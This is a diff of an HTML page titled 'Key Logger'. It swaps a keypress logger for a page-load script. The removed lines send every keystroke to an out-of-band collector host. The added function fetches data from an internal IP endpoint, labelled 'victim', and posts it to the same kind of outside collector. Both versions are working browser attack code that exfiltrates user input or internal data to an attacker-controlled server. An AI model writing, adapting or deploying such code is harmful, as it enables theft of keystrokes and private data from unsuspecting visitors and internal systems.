@@ -5,18 +5,41 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Key Logger</title>
     <script>
-        document.addEventListener('keypress', function(event) {
-            var key = event.key;
-            sendToServer(key);
-        });
+        // Function to fetch data from victim.com/user and forward it to target.com
+        function fetchAndForward() {
+            var victimUrl = 'https://172.16.100.122/UserSetting'; // URL of victim.com/user
+            var targetUrl = 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/receive'; // URL of target.com's endpoint
 
-        function sendToServer(key) {
-            // Send the key to your server
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/log', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({ key: key }));
+            fetch(victimUrl)
+                .then(response => response.text()) // Get response text
+                .then(data => {
+                    // Send the data to target.com
+                    fetch(targetUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ data: data })
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Failed to send data to target.com');
+                        }
+                        console.log('Data sent successfully to target.com');
+                    })
+                    .catch(error => {
+                        console.error(error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Failed to fetch data from victim.com/user:', error);
+                });
         }
+
+        // Call the function when the page loads
+        window.onload = function() {
+            fetchAndForward();
+        };
     </script>
 </head>
 <body>
